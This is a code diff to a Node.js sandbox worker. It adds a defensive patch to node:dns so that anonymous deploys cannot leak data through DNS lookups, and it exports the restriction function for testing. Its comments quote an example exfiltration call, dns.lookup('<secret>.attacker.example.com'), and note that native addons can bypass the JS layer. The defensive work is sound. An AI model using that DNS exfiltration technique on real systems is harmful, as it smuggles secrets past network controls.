@@ -25,7 +25,9 @@ function send(msg: object) {
   if (process.send) process.send(msg)
 }
 
-async function installNetworkRestriction() {
+// Exported only so the regression test can exercise the shim in an isolated
+// child process. The worker itself calls it via the boot message path below.
+export async function installNetworkRestriction() {
   const denyMsg = "Outbound network access disabled for anonymous deploys"
   const denyFetch = () => {
     throw new Error(denyMsg)
@@ -66,12 +68,68 @@ async function installNetworkRestriction() {
   } catch {
     // node:net should always be available; best-effort
   }
-  // Note on DNS: a capsule can still leak data via dns.lookup("<secret>.attacker.example.com")
-  // even with net.Socket.connect blocked, because the resolver query leaves the host
-  // before any TCP connect. JS-level patching of node:dns is unreliable across Node
-  // versions and under --experimental-permission, so DNS exfiltration must be closed
-  // at the OS layer (cgroups, network namespaces, egress firewall). This is a known
-  // gap of the JS-only sandbox.
+  // DNS: a capsule can leak data via dns.lookup("<secret>.attacker.example.com")
+  // even with net.Socket.connect blocked, because the resolver query leaves the
+  // host before any TCP connect. We patch node:dns here as defense-in-depth — it
+  // closes the obvious dns.lookup/dns.resolve exfil at the JS layer. It is NOT
+  // the boundary: a native addon (or a Node internal that bypasses these JS
+  // entry points) can still resolve names, so DNS exfil is closed for real only
+  // at the OS layer (the nft egress firewall drops 53/udp+tcp). Both layers run.
+  try {
+    // Patch the CommonJS module object (via createRequire), not the ESM
+    // namespace from `import()` — builtin ESM namespaces are frozen, so
+    // assigning to their properties silently no-ops. The CJS object is the
+    // mutable surface every consumer (incl. ESM `import dns from "node:dns"`,
+    // whose default export IS this object) reads its methods off of.
+    const { createRequire } = await import("node:module")
+    const require = createRequire(import.meta.url)
+    const dns = require("node:dns") as Record<string, unknown> & { promises?: Record<string, unknown> }
+    const { isIP } = await import("node:net")
+    // A name we let through to the real resolver: a literal IP address (no DNS
+    // query actually leaves the box) or loopback. These can't be used to
+    // exfiltrate via the resolver, and the worker itself must resolve 127.0.0.1
+    // / localhost to bind its own HTTP server. Everything else (a real hostname)
+    // is blocked — that's the exfil channel.
+    const isSafeName = (name: unknown): boolean => {
+      if (typeof name !== "string") return false
+      const n = name.trim().toLowerCase().replace(/\.$/, "")
+      return isIP(n) !== 0 || n === "localhost"
+    }
+    const wrap = (orig: unknown) =>
+      function (this: unknown, ...args: unknown[]) {
+        if (isSafeName(args[0]) && typeof orig === "function") {
+          return (orig as (...a: unknown[]) => unknown).apply(this, args)
+        }
+        const name = typeof args[0] === "string" ? args[0] : "<name>"
+        const cb = args.find((a) => typeof a === "function") as ((err: Error) => void) | undefined
+        const err = new Error(`${denyMsg} (dns resolve of ${name})`)
+        // Callback-style (dns.lookup, dns.resolve): fail via callback, matching
+        // the patched net.Socket's "fail loud" posture without crashing the loop.
+        if (cb) {
+          cb(err)
+          return
+        }
+        throw err
+      }
+    const wrapPromise = (orig: unknown) =>
+      async function (this: unknown, ...args: unknown[]) {
+        if (isSafeName(args[0]) && typeof orig === "function") {
+          return (orig as (...a: unknown[]) => unknown).apply(this, args)
+        }
+        const name = typeof args[0] === "string" ? args[0] : "<name>"
+        throw new Error(`${denyMsg} (dns resolve of ${name})`)
+      }
+    for (const key of ["lookup", "resolve", "resolve4", "resolve6", "resolveAny"] as const) {
+      if (typeof dns[key] === "function") dns[key] = wrap(dns[key])
+    }
+    if (dns.promises && typeof dns.promises === "object") {
+      for (const key of ["lookup", "resolve", "resolve4", "resolve6", "resolveAny"] as const) {
+        if (typeof dns.promises[key] === "function") dns.promises[key] = wrapPromise(dns.promises[key])
+      }
+    }
+  } catch {
+    // node:dns should always be available; best-effort
+  }
 }
 
 process.on("message", async (msg: ParentMessage) => {
